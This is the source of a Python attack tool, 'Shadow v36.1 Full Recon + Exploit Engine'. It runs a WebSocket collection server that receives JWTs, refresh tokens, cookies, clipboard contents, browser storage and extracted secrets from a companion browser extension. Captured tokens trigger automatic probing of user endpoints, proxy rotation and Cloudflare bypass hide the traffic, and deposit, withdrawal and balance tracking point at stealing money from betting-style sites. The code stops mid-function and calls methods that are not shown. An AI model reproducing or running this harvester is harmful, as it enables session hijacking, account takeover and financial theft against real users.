#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# Shadow v36.1 â Full Recon + Exploit Engine (patched)
# CompatÃ­vel com _sombra_ext/ (manifest v4.6)
# Apex Framework Integration
# ============================================================
# CorreÃ§Ãµes v36 â v36.1:
#   - _test_endpoints: conta sÃ³ status sensÃ­veis (200/201/202/204)
#   - _sql_injection: registra erro SQL como achado, independente de token
#   - _jwt_algorithm_confusion: implementa key confusion real (HS256 + JWKS)
#   - _house_balance: distingue 401 de 0 real
#   - WebSocket: fila por conexÃ£o (sem sobrescrever websocket)
#   - main(): valida expiraÃ§Ã£o do token restaurado do autosave
#   - _download_file / _probe_user_endpoints: locks corretos
# ============================================================

import os
import sys
import json
import time
import re
import threading
import asyncio
import websockets
import base64
import hashlib
import hmac
import logging
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional, List, Tuple
import queue
import collections
import itertools

# ============================================================
# UTF-8 STDOUT/STDERR WRAPPER (Windows cp1252 fix)
# ============================================================
if sys.platform == 'win32':
    import io
    for attr in ('stdout', 'stderr'):
        stream = getattr(sys, attr)
        if stream and getattr(stream, 'encoding', None) not in ('utf-8', 'UTF-8'):
            try:
                setattr(sys, attr, io.TextIOWrapper(getattr(sys, attr).buffer, encoding='utf-8', errors='replace'))
            except Exception:
                pass

# ============================================================
# LOGGER
# ============================================================
class ColoredFormatter(logging.Formatter):
    FORMATS = {
        logging.DEBUG: "\033[90m%(message)s\033[0m",
        logging.INFO: "\033[36m%(message)s\033[0m",
        logging.WARNING: "\033[33m%(message)s\033[0m",
        logging.ERROR: "\033[91m%(message)s\033[0m",
        logging.CRITICAL: "\033[1;91m%(message)s\033[0m",
    }
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(log_fmt, datefmt='%H:%M:%S')
        return formatter.format(record)

log = logging.getLogger("shadow")
log.setLevel(logging.INFO)
sh = logging.StreamHandler()
sh.setFormatter(ColoredFormatter())
log.addHandler(sh)

log_queue = queue.Queue()
class QueueHandler(logging.Handler):
    def emit(self, record):
        try:
            log_queue.put_nowait(self.format(record))
        except Exception:
            pass
log.addHandler(QueueHandler())

# ============================================================
# CORES
# ============================================================
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[35m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    ORANGE = "\033[38;5;208m"
    PURPLE = "\033[38;5;129m"
    PINK = "\033[38;5;205m"

def icon(n):
    icons = {
        "ok": f"{C.GREEN}â{C.RESET}", "fail": f"{C.RED}â{C.RESET}",
        "warn": f"{C.YELLOW}â {C.RESET}", "info": f"{C.CYAN}â{C.RESET}",
        "house": f"{C.MAGENTA}ð {C.RESET}", "deposit": f"{C.GREEN}ð°{C.RESET}",
        "withdraw": f"{C.RED}ð¸{C.RESET}", "token": f"{C.GREEN}ð¯{C.RESET}",
        "domain": f"{C.MAGENTA}ð{C.RESET}", "connection": f"{C.CYAN}ð{C.RESET}",
        "fire": f"{C.RED}ð¥{C.RESET}", "scan": f"{C.BLUE}ð¡{C.RESET}",
        "user": f"{C.WHITE}ð¤{C.RESET}", "transfer": f"{C.YELLOW}ð{C.RESET}",
        "wallet": f"{C.GREEN}ð{C.RESET}", "admin": f"{C.PURPLE}ð{C.RESET}",
        "elevate": f"{C.ORANGE}â¬ï¸{C.RESET}", "search": f"{C.CYAN}ð{C.RESET}",
        "adapter": f"{C.PINK}ð§{C.RESET}", "auto": f"{C.BLUE}ð¤{C.RESET}",
        "success": f"{C.GREEN}â­{C.RESET}", "stable": f"{C.CYAN}ð¡ï¸{C.RESET}",
        "cors": f"{C.RED}ð{C.RESET}", "graphql": f"{C.CYAN}ð¡{C.RESET}",
        "sub": f"{C.GREEN}ð¿{C.RESET}", "csrf": f"{C.YELLOW}ð¡ï¸{C.RESET}",
        "waf": f"{C.ORANGE}ð{C.RESET}", "cookie": f"{C.YELLOW}ðª{C.RESET}",
        "storage": f"{C.CYAN}ð¾{C.RESET}", "route": f"{C.BLUE}ð£ï¸{C.RESET}",
        "file": f"{C.RED}ð{C.RESET}", "vuln": f"{C.RED}ð{C.RESET}",
        "idor": f"{C.YELLOW}ð¯{C.RESET}", "redirect": f"{C.ORANGE}ð{C.RESET}",
        "iframe": f"{C.BLUE}ð¼ï¸{C.RESET}", "hsts": f"{C.GREEN}ð{C.RESET}",
        "rate": f"{C.RED}â±ï¸{C.RESET}", "api": f"{C.CYAN}ð¦{C.RESET}",
        "meta": f"{C.YELLOW}ð·ï¸{C.RESET}", "tech": f"{C.BLUE}âï¸{C.RESET}",
        "console": f"{C.WHITE}ð¥ï¸{C.RESET}", "worker": f"{C.PURPLE}ð§{C.RESET}",
        "proxy": f"{C.ORANGE}ð{C.RESET}", "save": f"{C.CYAN}ð¾{C.RESET}",
        "discord": f"{C.BLUE}ð¢{C.RESET}", "dump": f"{C.MAGENTA}ð¦{C.RESET}",
        "clear": f"{C.GRAY}ðï¸{C.RESET}", "config": f"{C.YELLOW}âï¸{C.RESET}",
        "sse": f"{C.CYAN}ð¡{C.RESET}", "clipboard": f"{C.GREEN}ð{C.RESET}",
        "refresh": f"{C.ORANGE}ð{C.RESET}",
    }
    return icons.get(n, "â¢")

def print_progress(current, total, label=""):
    if total <= 0: return
    percent = int((current / total) * 100)
    bar = "â" * int(percent / 2) + "â" * (50 - int(percent / 2))
    msg = f"\r  {C.CYAN}â³{C.RESET} {label} [{bar}] {percent}% ({current}/{total})"
    with stdout_lock:
        sys.stdout.write(msg)
        sys.stdout.flush()

# ============================================================
# PROXY ROTATOR
# ============================================================
class ProxyRotator:
    def __init__(self, proxy_file="proxies.txt"):
        self.proxies = []
        self.current_idx = 0
        self.lock = threading.Lock()
        self._load_proxies(proxy_file)

    def _load_proxies(self, proxy_file):
        try:
            p = Path(proxy_file)
            if p.exists():
                with open(p, encoding='utf-8') as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                log.info(f"ð {len(self.proxies)} proxies carregados")
        except Exception:
            pass

    def get_next(self):
        with self.lock:
            if not self.proxies: return None
            proxy = self.proxies[self.current_idx % len(self.proxies)]
            self.current_idx += 1
            return proxy

proxy_rotator = ProxyRotator()

# ============================================================
# SHADOWCF
# ============================================================
try:
    from curl_cffi import requests as curl_req
    HAS_CURL = True
except ImportError:
    HAS_CURL = False
    curl_req = None

class ShadowCF:
    def __init__(self, domain: str):
        self.domain = domain
        self.cookies: dict = {}
        self.bypassed = False
        self.requests_made = 0
        self.last_request_time = 0
        self.rate_limited = False

    def _wait_if_rate_limited(self):
        now = time.time()
        if self.rate_limited and now - self.last_request_time < 2:
            time.sleep(0.5)
        self.last_request_time = time.time()
        self.requests_made += 1

    def bypass(self) -> bool:
        if self.bypassed: return True
        if HAS_CURL:
            for imp in ["chrome131", "chrome124"]:
                proxy = proxy_rotator.get_next()
                kwargs = {"impersonate": imp, "timeout": 10}
                if proxy:
                    kwargs["proxies"] = {"http": proxy, "https": proxy}
                try:
                    resp = curl_req.get(f"https://{self.domain}/", **kwargs)
                    if resp.status_code in (200, 403):
                        self.cookies = dict(resp.cookies)
                        self.bypassed = True
                        return True
                except Exception:
                    pass
        try:
            req = urllib.request.Request(f"https://{self.domain}/")
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status in (200, 403):
                    self.bypassed = True
                    return True
        except Exception:
            pass
        return False

    def get(self, url: str, headers: dict = None, timeout: int = 10) -> dict:
        self._wait_if_rate_limited()
        merged = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "Accept": "application/json"}
        if headers: merged.update(headers)
        proxy = proxy_rotator.get_next()
        if HAS_CURL:
            kwargs = {"impersonate": "chrome131", "headers": merged, "cookies": self.cookies, "timeout": timeout}
            if proxy: kwargs["proxies"] = {"http": proxy, "https": proxy}
            try:
                resp = curl_req.get(url, **kwargs)
                return {"status": resp.status_code, "body": resp.text, "headers": dict(resp.headers)}
            except Exception as e:
                err = str(e)
                if '429' in err or 'Too Many Requests' in err:
                    self.rate_limited = True
                return {"status": 0, "body": err, "headers": {}}
        else:
            try:
                req = urllib.request.Request(url, headers=merged)
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    return {"status": resp.status, "body": resp.read().decode(), "headers": dict(resp.headers)}
            except urllib.error.HTTPError as e:
                return {"status": e.code, "body": e.read().decode() if hasattr(e, 'read') else '', "headers": dict(e.headers)}
            except Exception as e:
                return {"status": 0, "body": str(e), "headers": {}}

    def post(self, url: str, json_data: dict = None, data: str = None, headers: dict = None, timeout: int = 10) -> dict:
        self._wait_if_rate_limited()
        merged = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "Accept": "application/json", "Content-Type": "application/json"}
        if headers: merged.update(headers)
        proxy = proxy_rotator.get_next()
        if HAS_CURL:
            kwargs = {"impersonate": "chrome131", "headers": merged, "cookies": self.cookies, "timeout": timeout}
            if json_data: kwargs["json"] = json_data
            if data: kwargs["data"] = data
            if proxy: kwargs["proxies"] = {"http": proxy, "https": proxy}
            try:
                resp = curl_req.post(url, **kwargs)
                return {"status": resp.status_code, "body": resp.text, "headers": dict(resp.headers)}
            except Exception as e:
                err = str(e)
                if '429' in err or 'Too Many Requests' in err:
                    self.rate_limited = True
                return {"status": 0, "body": err, "headers": {}}
        else:
            try:
                body_bytes = json.dumps(json_data).encode() if json_data else (data.encode() if data else b"")
                req = urllib.request.Request(url, data=body_bytes, headers=merged)
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    return {"status": resp.status, "body": resp.read().decode(), "headers": dict(resp.headers)}
            except urllib.error.HTTPError as e:
                return {"status": e.code, "body": e.read().decode() if hasattr(e, 'read') else '', "headers": dict(e.headers)}
            except Exception as e:
                return {"status": 0, "body": str(e), "headers": {}}

_cf = {}
_cf_lock = threading.Lock()
def get_cf(domain):
    with _cf_lock:
        if domain not in _cf:
            _cf[domain] = ShadowCF(domain)
        return _cf[domain]

# ============================================================
# JWT FUNCTIONS
# ============================================================
def is_jwt(token: str) -> bool:
    if not token or not isinstance(token, str): return False
    parts = token.split('.')
    if len(parts) != 3: return False
    if not token.startswith('eyJ'): return False
    if len(parts[0]) < 10 or len(parts[1]) < 10: return False
    return True

def b64_decode_url(s: str):
    if not s: return None
    try:
        s += '=' * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))
    except Exception:
        return None

def b64_encode_url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

def extract_user_id(token: str) -> Optional[str]:
    decoded = b64_decode_url(token.split('.')[1]) if token.count('.') == 2 else None
    if isinstance(decoded, dict):
        for field in ['sub', 'id', 'userId', 'user_id', 'accountId', 'account_id', 'uid', 'playerId', 'app_uid', 'account']:
            if field in decoded: return str(decoded[field])
    return None

def token_is_expired(token: str) -> bool:
    decoded = b64_decode_url(token.split('.')[1]) if token.count('.') == 2 else None
    if not isinstance(decoded, dict): return False
    exp = decoded.get('exp')
    if exp is None: return False
    try:
        return int(exp) < int(time.time())
    except Exception:
        return False

def analyze_jwt_issues(token: str) -> List[dict]:
    issues = []
    try:
        parts = token.split('.')
        if len(parts) < 2: return issues
        decoded = b64_decode_url(parts[1])
        header = b64_decode_url(parts[0])
        if not isinstance(decoded, dict): return issues
        now = int(time.time())
        if isinstance(header, dict):
            alg = header.get('alg')
            if alg == 'none':
                issues.append({'severity': 'critical', 'desc': 'alg:none â assinatura bypassÃ¡vel'})
            elif alg == 'HS256':
                issues.append({'severity': 'low', 'desc': 'HS256 detectado â possÃ­vel brute force'})
            elif alg in ('HS384', 'HS512'):
                issues.append({'severity': 'low', 'desc': f'{alg} detectado'})
            kid = header.get('kid')
            if isinstance(kid, str) and ('..' in kid or '/' in kid or '\\' in kid):
                issues.append({'severity': 'high', 'desc': f"kid com path traversal: {kid}"})
            if isinstance(header.get('jku'), str):
                issues.append({'severity': 'medium', 'desc': f"jku presente: {header['jku']}"})
            if isinstance(header.get('x5u'), str):
                issues.append({'severity': 'medium', 'desc': f"x5u presente: {header['x5u']}"})
        if 'exp' in decoded:
            exp = int(decoded['exp'])
            if exp < now: issues.append({'severity': 'info', 'desc': f'Expirado hÃ¡ {(now - exp) // 3600}h'})
            elif exp - now < 3600: issues.append({'severity': 'medium', 'desc': f'Expira em {(exp - now) // 60}min'})
        else:
            issues.append({'severity': 'medium', 'desc': 'Sem exp â token nÃ£o expira?'})
        roles = decoded.get('role') or decoded.get('roles') or decoded.get('permission') or decoded.get('permissions')
        if roles:
            role_str = json.dumps(roles).lower()
            if re.search(r'admin|superadmin|root|moderator', role_str):
                issues.append({'severity': 'high', 'desc': f'Role/admin detectado: {roles}'})
        if decoded.get('type') == 'refresh' or decoded.get('token_type') == 'refresh':
            issues.append({'severity': 'high', 'desc': 'Refresh token detectado'})
        if decoded.get('iss'):
            issues.append({'severity': 'info', 'desc': f'Issuer: {decoded["iss"]}'})
        if decoded.get('aud'):
            issues.append({'severity': 'info', 'desc': f'Audience: {json.dumps(decoded["aud"])}'})
    except Exception:
        pass
    return issues

# ============================================================
# CONFIG
# ============================================================
CONFIG_FILE = Path(__file__).parent / "sombra_config.json"
ACCOUNTS_FILE = Path(__file__).parent / "accounts.json"
DISCORD_WEBHOOK = ""
AUTO_SAVE_INTERVAL = 30

def load_config():
    global DISCORD_WEBHOOK, AUTO_SAVE_INTERVAL
    try:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, encoding='utf-8') as f:
                cfg = json.load(f)
            DISCORD_WEBHOOK = cfg.get('discord_webhook', '')
            AUTO_SAVE_INTERVAL = cfg.get('auto_save_interval', 30)
            log.info(f"âï¸ Config loaded from {CONFIG_FILE}")
    except Exception:
        pass

def load_accounts():
    accounts = []
    try:
        if ACCOUNTS_FILE.exists():
            with open(ACCOUNTS_FILE, encoding='utf-8') as f:
                d = json.load(f)
            accounts = d.get('accounts', [])
        elif CONFIG_FILE.exists():
            with open(CONFIG_FILE, encoding='utf-8') as f:
                cfg = json.load(f)
            accounts = cfg.get('accounts', [])
    except Exception:
        pass
    return accounts

# ============================================================
# DATA STORE
# ============================================================
data = {
    'tokens': [], 'accounts': [], 'domains': [], 'connections': 0,
    'deposits': [], 'withdrawals': [], 'transfers': [],
    'house_balance': 0, 'house_endpoints': [], 'vulnerabilities': [],
    'admin_tokens': [], 'current_account': None, 'scan_results': {},
    'adapter_results': {}, 'auto_scan_complete': False,
    'websocket_connected': False, 'websocket_retries': 0,
    'profiles': [], 'balances': [], 'cookies': [], 'cookie_analysis': [],
    'storage': [], 'network_requests': [], 'admin_endpoints': [],
    'admin_probes': [], 'sensitive_files': [], 'security_analysis': [],
    'secret_analyses': [], 'downloaded_files': [], 'indexeddb_data': [],
    'cache_data': [], 'websql_data': [], 'browser_fingerprint': [],
    'performance_data': [], 'navigation_history': [], 'idor_data': [],
    'extracted_routes': [], 'technologies': [], 'service_workers': [],
    'console_captures': [], 'cors_tests': [], 'graphql_tests': [],
    'subdomain_results': [], 'rate_limit_results': [], 'hsts_results': [],
    'iframe_results': [], 'api_versions': [], 'sensitive_meta': [],
    'link_results': [], 'csrf_results': [], 'open_redirect_results': [],
    'waf_results': [],
    'sse_captures': [], 'clipboard_data': [], 'refresh_tokens': [],
    'auto_withdraw_running': False, 'withdraw_log': [],
    'stats': {
        'total_tokens': 0, 'total_cookies': 0, 'total_requests': 0,
        'total_endpoints': 0, 'total_vulns': 0, 'total_admin_access': 0,
        'start_time': int(time.time()), 'uptime': 0, 'current_time': 0
    }
}
data_lock = threading.RLock()
stdout_lock = threading.Lock()

# ============================================================
# AUTO-SAVE
# ============================================================
_last_save_hash = None

def _compute_hash(d):
    raw = json.dumps(d, sort_keys=True, default=str)
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

def auto_save():
    global _last_save_hash
    while True:
        time.sleep(AUTO_SAVE_INTERVAL)
        try:
            with data_lock:
                current_data = {k: v for k, v in data.items()}
            current_hash = _compute_hash(current_data)
            if current_hash == _last_save_hash: continue
            _last_save_hash = current_hash
            ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
            filename = Path(__file__).parent / f"sombra_autosave_{ts}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(current_data, f, indent=2, ensure_ascii=False, default=str)
            stats = []
            if current_data.get('tokens'): stats.append(f"ð¯ {len(current_data['tokens'])} tokens")
            if current_data.get('accounts'): stats.append(f"ð¤ {len(current_data['accounts'])} accounts")
            if current_data.get('vulnerabilities'): stats.append(f"ð {len(current_data['vulnerabilities'])} vulns")
            if current_data.get('sse_captures'): stats.append(f"ð¡ {len(current_data['sse_captures'])} SSE")
            if current_data.get('refresh_tokens'): stats.append(f"ð {len(current_data['refresh_tokens'])} refresh")
            if stats: log.info(f"ð¾ Save: {', '.join(stats)}")
            else: log.debug("ð¾ Save: empty snapshot")
            autosaves = sorted(Path(__file__).parent.glob('sombra_autosave_*.json'), key=lambda p: p.stat().st_mtime)
            if len(autosaves) > 20:
                for old_file in autosaves[:-20]:
                    try: old_file.unlink()
                    except Exception: pass
        except Exception as e:
            log.warning(f"Auto-save falhou: {e}")

# ============================================================
# WEBSOCKET MANAGER â fila por conexÃ£o (fix race)
# ============================================================
class WebSocketManager:
    def __init__(self, host="0.0.0.0", port=8766):
        self.host = host
        self.port = port
        self.running = False
        self.connected = False
        self.retry_count = 0
        self.max_retries = 10
        self.retry_delay = 3
        self.loop = None
        self.thread = None
        self.clients = {}   # cid -> (ws, asyncio.Queue)
        self.clients_lock = threading.Lock()
        self.msg_buffer = collections.deque(maxlen=5000)

    def start(self):
        if self.running: return
        self.running = True
        self.thread = threading.Thread(target=self._run_server, daemon=True)
        self.thread.start()
        log.info("ð WebSocket server starting...")

    def _run_server(self):
        asyncio.set_event_loop(asyncio.new_event_loop())
        self.loop = asyncio.get_event_loop()
        while self.running:
            try:
                self.loop.run_until_complete(self._serve())
            except Exception as e:
                log.error(f"WebSocket error: {e}")
                self.connected = False
                self.retry_count += 1
                if self.retry_count > self.max_retries:
                    log.error(f"â WebSocket: max retries ({self.max_retries})")
                    self.running = False
                    break
                log.info(f"ð Reconnecting in {self.retry_delay}s... ({self.retry_count}/{self.max_retries})")
                time.sleep(self.retry_delay)

    async def _serve(self):
        async with websockets.serve(
            self._handler,
            self.host,
            self.port,
            ping_interval=20,
            ping_timeout=60,
            max_size=10 * 1024 * 1024,
        ):
            self.connected = True
            self.retry_count = 0
            log.info(f"ð WebSocket: ws://{self.host}:{self.port}")
            data['websocket_connected'] = True
            await asyncio.Future()

    async def _handler(self, websocket):
        cid = id(websocket)
        out_q: asyncio.Queue = asyncio.Queue()
        with self.clients_lock:
            self.clients[cid] = (websocket, out_q)
        with data_lock:
            data['connections'] += 1
            data['websocket_connected'] = True
        log.info(f"ð Client connected ({data['connections']})")

        async def sender():
            while True:
                msg = await out_q.get()
                if msg is None: break
                try:
                    await websocket.send(msg)
                except Exception:
                    break

        sender_task = asyncio.create_task(sender())
        try:
            async for message in websocket:
                try:
                    msg = json.loads(message)
                    self._process_message(msg)
                    await out_q.put(json.dumps({'status': 'ok', 'type': 'ack', 'timestamp': datetime.utcnow().isoformat()}))
                except json.JSONDecodeError:
                    await out_q.put(json.dumps({'status': 'error', 'message': 'Invalid JSON'}))
                except Exception as e:
                    log.error(f"Error processing message: {e}")
        except websockets.exceptions.ConnectionClosed:
            log.info("ð Client disconnected")
        finally:
            await out_q.put(None)
            try:
                await sender_task
            except Exception:
                pass
            with self.clients_lock:
                self.clients.pop(cid, None)
            with data_lock:
                data['connections'] -= 1
                data['websocket_connected'] = bool(self.clients)
            log.info(f"ð Client disconnected ({data['connections']} remain)")

    def broadcast(self, obj: dict):
        payload = json.dumps(obj)
        if not self.loop: return
        with self.clients_lock:
            clients = list(self.clients.values())
        for _, out_q in clients:
            try:
                self.loop.call_soon_threadsafe(out_q.put_nowait, payload)
            except Exception:
                pass

    def _process_message(self, msg: dict):
        msg_type = msg.get('type', 'unknown')
        ts = datetime.utcnow().isoformat()

        with data_lock:
            if msg_type == 'full_dump':
                self._handle_full_dump(msg)
                return

            elif msg_type == 'token':
                token = msg.get('token')
                domain = msg.get('domain', 'unknown')
                source = msg.get('source', 'unknown')
                analysis = msg.get('analysis', {})
                user_id = msg.get('userId') or (extract_user_id(token) if is_jwt(token) else None)
                if not is_jwt(token): return
                if any(t.get('token') == token for t in data['tokens']): return
                issues = analyze_jwt_issues(token)
                token_data = {
                    'token': token, 'userId': user_id, 'domain': domain,
                    'source': source, 'endpoint': msg.get('endpoint', ''),
                    'note': msg.get('note', ''), 'analysis': analysis,
                    'jwt_issues': issues, 'timestamp': ts
                }
                data['tokens'].append(token_data)
                data['stats']['total_tokens'] = len(data['tokens'])
                if user_id:
                    account = {'domain': domain, 'token': token, 'account_id': user_id, 'user_id': user_id, 'source': source, 'status': 'active'}
                    if not any(a.get('account_id') == user_id and a.get('domain') == domain for a in data['accounts']):
                        data['accounts'].append(account)
                    data['current_account'] = account
                    admin_issues = [i for i in issues if 'admin' in i.get('desc', '').lower()]
                    log.info(f"ð¯ JWT ({source})! User ID: {user_id} | Issues: {len(issues)} {'| ADMIN!' if admin_issues else ''}")
                    threading.Thread(target=self._probe_user_endpoints, args=(user_id, domain, token), daemon=True).start()
                else:
                    log.debug(f"ð¯ JWT captured! Domain: {domain} | Source: {source}")

            elif msg_type == 'refresh_token':
                refresh = msg
                data['refresh_tokens'].append(refresh)
                log.info(f"ð Refresh token from {refresh.get('domain', 'unknown')} ({refresh.get('source', 'unknown')})")

            elif msg_type == 'domain':
                domain = msg.get('domain')
                if domain and domain not in data['domains']:
                    data['domains'].append(domain)
                    log.debug(f"ð Domain captured: {domain}")

            elif msg_type == 'cookies':
                domain = msg.get('domain', 'unknown')
                count = msg.get('count', 0)
                sensitive = msg.get('sensitive', 0)
                data['stats']['total_cookies'] += count
                log.debug(f"ðª {count} cookies from {domain} ({sensitive} sensitive)")

            elif msg_type == 'storage':
                domain = msg.get('domain', 'unknown')
                items = msg.get('items', [])
                for item in items:
                    data['storage'].append({'domain': domain, 'key': item.get('key', ''), 'valuePreview': item.get('valuePreview', ''), 'timestamp': ts})

            elif msg_type == 'networkRequest':
                req = msg
                data['network_requests'].append(req)
                data['stats']['total_requests'] += 1
                body = req.get('responseBody', '')
                if body:
                    for t in re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', body):
                        if len(t) > 50 and is_jwt(t):
                            self._process_message({'type': 'token', 'token': t, 'domain': req.get('domain', 'unknown'), 'source': 'network_body', 'endpoint': req.get('url', '')})
                resp_headers = req.get('responseHeaders') or {}
                acao = resp_headers.get('access-control-allow-origin', '')
                if acao in ('*', 'null'):
                    vuln = {'domain': req.get('domain', 'unknown'), 'type': 'cors_wildcard', 'severity': 'high', 'desc': f'ACAO: {acao}', 'evidence': req.get('url', ''), 'timestamp': ts}
                    data['vulnerabilities'].append(vuln)
                    data['stats']['total_vulns'] += 1
                    log.info(f"ð CORS wildcard on {req.get('url', '')}")

            elif msg_type == 'sse_capture':
                sse = msg
                data['sse_captures'].append(sse)
                sse_data = sse.get('data', '')
                if sse_data:
                    for t in re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', sse_data):
                        if len(t) > 50 and is_jwt(t):
                            self._process_message({'type': 'token', 'token': t, 'domain': sse.get('domain', 'unknown'), 'source': 'sse', 'endpoint': sse.get('url', '')})
                log.debug(f"ð¡ SSE: {len(data['sse_captures'])} events captured")

            elif msg_type == 'clipboard_capture':
                cb = msg
                data['clipboard_data'].append(cb)
                text = cb.get('text', '')
                if text:
                    for t in re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', text):
                        if len(t) > 50 and is_jwt(t):
                            self._process_message({'type': 'token', 'token': t, 'domain': cb.get('domain', 'unknown'), 'source': 'clipboard', 'endpoint': ''})
                log.debug(f"ð Clipboard: {len(data['clipboard_data'])} items")

            elif msg_type == 'admin_endpoints':
                domain = msg.get('domain', 'unknown')
                endpoints = msg.get('endpoints', [])
                data['admin_endpoints'].append({'domain': domain, 'endpoints': endpoints})
                data['stats']['total_endpoints'] += len(endpoints)

            elif msg_type == 'admin_probe':
                probe = msg.get('data', msg)
                domain = probe.get('domain', 'unknown')
                authenticated = probe.get('authenticatedEndpoints', [])
                data['admin_probes'].append(probe)
                granted = [e for e in authenticated if e.get('level') == 'access_granted']
                for ep in granted:
                    data['stats']['total_admin_access'] += 1
                    vuln = {'domain': domain, 'type': 'admin_access_with_token', 'severity': 'critical', 'desc': f'Admin access: {ep.get("url", "")}', 'evidence': ep.get('url', ''), 'timestamp': ts}
                    data['vulnerabilities'].append(vuln)
                    data['stats']['total_vulns'] += 1
                    log.info(f"ð ADMIN ACCESS! {ep.get('url', '')} â {domain}")

            elif msg_type == 'vulnerability':
                vuln = msg
                data['vulnerabilities'].append(vuln)
                data['stats']['total_vulns'] += 1
                severity = vuln.get('severity', 'medium').upper()
                log.info(f"ð [{severity}] {vuln.get('type', '')}: {vuln.get('desc', '')[:60]} ({vuln.get('domain', '')})")

            elif msg_type == 'secret_analysis':
                analysis = msg.get('data', msg)
                domain = analysis.get('domain', 'unknown')
                secrets = analysis.get('secrets', [])
                data['secret_analyses'].append(analysis)
                for secret in secrets:
                    secret_entry = {'domain': domain, 'url': analysis.get('url', ''), 'type': secret.get('type', 'unknown'), 'value': secret.get('value', '')[:200], 'fileType': analysis.get('fileType', 'unknown'), 'timestamp': ts}
                    data['downloaded_files'].append(secret_entry)
                    if secret.get('type') in ['JWT_SECRET', 'DB_PASSWORD', 'PRIVATE_KEY', 'AWS_SECRET']:
                        vuln = {'domain': domain, 'type': 'exposed_secret', 'severity': 'critical' if secret.get('type') in ['PRIVATE_KEY', 'AWS_SECRET'] else 'high', 'desc': f"{secret.get('type')}: {secret.get('value', '')[:30]}...", 'evidence': analysis.get('url', ''), 'timestamp': ts}
                        data['vulnerabilities'].append(vuln)
                        data['stats']['total_vulns'] += 1
                log.info(f"ð {len(secrets)} secrets extracted from {analysis.get('url', 'unknown')}")

            elif msg_type == 'request_file_download':
                file_url = msg.get('url', '')
                domain = msg.get('domain', 'unknown')
                file_type = msg.get('fileType', 'unknown')
                threading.Thread(target=self._download_file, args=(file_url, domain, file_type), daemon=True).start()

            elif msg_type == 'security_analysis':
                analysis = msg.get('data', msg)
                domain = analysis.get('domain', 'unknown')
                vulns = analysis.get('vulnerabilities', [])
                data['security_analysis'].append(analysis)
                for v in vulns:
                    vuln_entry = {'domain': domain, 'type': v.get('type', 'unknown'), 'severity': v.get('severity', 'medium'), 'desc': v.get('desc', ''), 'evidence': analysis.get('url', ''), 'timestamp': ts}
                    data['vulnerabilities'].append(vuln_entry)
                    data['stats']['total_vulns'] += 1

            elif msg_type == 'cors_tests':
                result = msg.get('data', msg)
                data['cors_tests'].append(result)
                dangerous = [t for t in result.get('tests', []) if t.get('dangerous')]
                if dangerous:
                    log.info(f"ð CORS: {len(dangerous)} dangerous in {result.get('domain', 'unknown')}")

            elif msg_type == 'graphql_tests':
                result = msg.get('data', msg)
                data['graphql_tests'].append(result)
                introspected = [e for e in result.get('endpoints', []) if e.get('introspection')]
                if introspected:
                    log.info(f"ð¡ GraphQL INTROSPECTION OPEN in {result.get('domain', 'unknown')}!")

            elif msg_type == 'subdomain_enum':
                result = msg.get('data', msg)
                data['subdomain_results'].append(result)
                subs = result.get('subdomains', [])
                if subs:
                    log.info(f"ð¿ {len(subs)} subdomains: {', '.join(s.get('sub', '') for s in subs[:5])}")

            elif msg_type == 'profile_probe':
                probe = msg.get('data', msg)
                data['profiles'].append(probe)
                bal = probe.get('data', {}).get('balance')
                if bal is not None:
                    data['balances'].append({'userId': probe.get('userId'), 'domain': probe.get('domain'), 'balance': float(bal), 'timestamp': ts})
                    log.info(f"ð° Balance: User {probe.get('userId')} = {bal}")

            else:
                log.debug(f"ð© Unknown msg: {msg_type}")

    def _handle_full_dump(self, msg: dict):
        stats = msg.get('stats', {})
        with data_lock:
            data['stats'] = {**data['stats'], **stats}
            for key in ['tokens', 'profiles', 'balances', 'domains', 'cookies',
                         'admin_endpoints', 'admin_probes', 'sensitive_files',
                         'security_analysis', 'cors_tests', 'graphql_tests',
                         'subdomain_results', 'idor_data', 'extracted_routes',
                         'technologies', 'vulnerabilities', 'csrf_results',
                         'open_redirect_results', 'waf_results', 'cookie_analysis',
                         'sse_captures', 'clipboard_data', 'refresh_tokens']:
                if key in msg:
                    existing = data.get(key, [])
                    existing_ids = set()
                    for item in existing:
                        if isinstance(item, dict):
                            if item.get('token'):
                                entry_id = f"token:{item.get('token','')}|{item.get('domain','')}"
                            else:
                                entry_id = '|'.join(str(item.get(k, '')) for k in ['userId', 'url', 'type', 'domain'])
                            existing_ids.add(entry_id)
                    for item in msg[key]:
                        if isinstance(item, dict):
                            if item.get('token'):
                                entry_id = f"token:{item.get('token','')}|{item.get('domain','')}"
                            else:
                                entry_id = '|'.join(str(item.get(k, '')) for k in ['userId', 'url', 'type', 'domain'])
                            if entry_id not in existing_ids:
                                existing.append(item)
                                existing_ids.add(entry_id)
